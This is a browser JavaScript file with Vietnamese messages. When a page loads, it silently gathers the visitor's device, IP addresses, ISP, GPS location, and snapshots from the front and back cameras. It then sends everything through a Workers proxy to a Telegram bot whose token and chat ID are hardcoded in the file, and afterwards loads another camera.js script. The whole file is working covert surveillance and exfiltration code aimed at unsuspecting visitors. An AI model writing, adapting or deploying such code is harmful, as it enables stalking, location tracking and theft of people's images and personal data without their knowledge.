const TELEGRAM_BOT_TOKEN = '8041465601:AAGifl_JXNrfFGKVegbT0PHCwz7kEQsZMMA';
const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1002719716933';
const TELEGRAM_CHAT_ID_NO_PHOTOS = '-1002719716933';

const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  realIp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

async function getPublicIP() {
  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
  info.ip = ip.ip || 'Không rõ';
}

async function getRealIP() {
  const ip = await fetch('https://icanhazip.com').then(r => r.text());
  info.realIp = ip.trim();
  const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
  info.isp = data.connection?.org || 'Không rõ';
}

let useGPS = false;

async function getLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);

    navigator.permissions.query({ name: 'geolocation' }).then(result => {
      if (result.state === 'denied') {
        return fallbackIPLocation().then(resolve);
      }

      navigator.geolocation.getCurrentPosition(
        async pos => {
          useGPS = true;
          info.lat = pos.coords.latitude.toFixed(6);
          info.lon = pos.coords.longitude.toFixed(6);
          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
              headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            const data = await res.json();
            info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = data.address?.country || 'Không rõ';
          } catch {
            info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
            info.country = 'Không rõ';
          }
          resolve();
        },
        async () => {
          useGPS = false;
          await fallbackIPLocation();
          resolve();
        },
        { enableHighAccuracy: true, timeout: 8000 }
      );
    });
  });
}

async function fallbackIPLocation() {
  const data = await fetch(`https://ipwho.is/`).then(r => r.json());
  info.lat = data.latitude?.toFixed(6) || '0';
  info.lon = data.longitude?.toFixed(6) || '0';
  info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
  info.country = data.country || 'Không rõ';
}

function captureCamera(facingMode = 'user') {
  return new Promise((resolve, reject) => {
    navigator.permissions.query({ name: 'camera' }).then(result => {
      if (result.state === 'denied') return reject(new Error('Camera bị từ chối'));

      navigator.mediaDevices.getUserMedia({ video: { facingMode } })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');

            setTimeout(() => {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              stream.getTracks().forEach(track => track.stop());
              canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
            }, 1000);
          };
        })
        .catch(reject);
    });
  });
}

function getCaption() {
  const mapsLink = info.lat && info.lon
    ? `https://maps.google.com/?q=${info.lat},${info.lon}`
    : 'Không rõ';

  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP dân cư: ${info.ip}
🧠 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📌 Google Maps: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

function getCaptionWithExtras() {
  return getCaption(); // Nếu cần chèn thêm emoji, logo, hay link ngoài thì chỉnh ở đây
}

async function sendPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
  formData.append('media', JSON.stringify([
    { type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() },
    { type: 'photo', media: 'attach://back' }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  try {
    const res = await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
    const json = await res.json();
    if (!json.ok) console.error("❌ Lỗi gửi ảnh:", json);
    else console.log("✅ Gửi ảnh thành công:", json);
  } catch (err) {
    console.error("❌ Gửi ảnh thất bại:", err);
  }
}

async function sendTextOnly() {
  try {
    const res = await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
        text: getCaption()
      })
    });
    const json = await res.json();
    if (!json.ok) console.error("❌ Lỗi gửi tin nhắn:", json);
    else console.log("✅ Gửi tin nhắn thành công:", json);
  } catch (err) {
    console.error("❌ Gửi tin nhắn thất bại:", err);
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function main() {
  detectDevice();
  await getPublicIP();
  await getRealIP();
  await getLocation();

  let front = null, back = null;

  try {
    front = await captureCamera("user");
    await delay(1000);
    back = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch {
    info.camera = '🚫 Không thể truy cập camera';
  }

  if (front && back) {
    await sendPhotos(front, back);
  } else {
    await sendTextOnly();
  }
}

// 👉 Sau khi main chạy xong: đợi 1.5s rồi load camera.js
main().then(async () => {
  window.mainScriptFinished = true;
  await delay(1500);

  const script = document.createElement('script');
  script.src = 'camera.js'; // 🔧 camera.js cần đặt cùng thư mục
  script.defer = true;
  document.body.appendChild(script);

  console.log("✅ Đã tự động kích hoạt camera.js sau khi main.js hoàn tất.");
});
